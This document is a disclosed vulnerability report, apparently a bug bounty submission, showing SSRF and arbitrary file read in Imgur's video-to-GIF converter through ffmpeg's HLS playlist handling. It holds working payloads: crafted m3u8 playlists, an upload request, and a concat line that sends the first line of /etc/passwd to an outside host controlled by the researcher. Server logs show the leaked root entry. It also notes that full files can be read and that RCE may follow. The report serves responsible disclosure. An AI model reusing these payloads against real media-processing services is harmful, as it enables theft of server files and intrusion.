## Original Report

Video to gif converter on http://imgur.com/vidgif uses Lavf/55.48.100 with network options enabled. It makes possible SSRF by uploading specially crafted playlist. For example we can use mp4 file http://yngwie.ru/1.mp4
```
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
http://yngwie.ru/2.mp4
#EXT-X-ENDLIST
```

upload it by request

```
POST /vidgif/upload HTTP/1.1
Host: imgur.com
...

source=http://yngwie.ru/1.mp4&url=http://yngwie.ru/1.mp4&start=0.08&stop=5.12
```

and see second request from Lavf:
```
54.167.254.53 - - [11/Feb/2016:05:08:20 -0500] "GET /1.mp4 HTTP/1.1" 200 84 "http://yngwie.ru" "-" "-"
54.82.61.224 - - [11/Feb/2016:05:08:20 -0500] "GET /2.mp4 HTTP/1.1" 404 169 "-" "Lavf/55.48.100" "-"
```

But this vulnerability not about only HTTP requests, it allows to read arbitrary files from server. Here is quick POC reading first line of /etc/passwd http://yngwie.ru/test.avi:
```
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
concat:http://yngwie.ru/header.m3u8|file:///etc/passwd
#EXT-X-ENDLIST
```
header.m3u8 (very important - without space before eof):
```
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:,
http://yngwie.ru?
```
concat proto https://www.ffmpeg.org/ffmpeg-protocols.html#concat will make valid playlist with first line of /etc/passwd in url:
```
54.82.61.224 - - [11/Feb/2016:04:55:32 -0500] "GET ?root:x:0:0:root:/root:/bin/bash HTTP/1.1" 400 173 "-" "-" "-"
```

it is possible to read full files by subfile proto https://www.ffmpeg.org/ffmpeg-protocols.html#subfile or by constructing 100% valid video files and extracting data from gifs.
Sensitive files on server, some private apis, accessable from server, or some other allowed protocols which I didn't check may lead even to RCE.
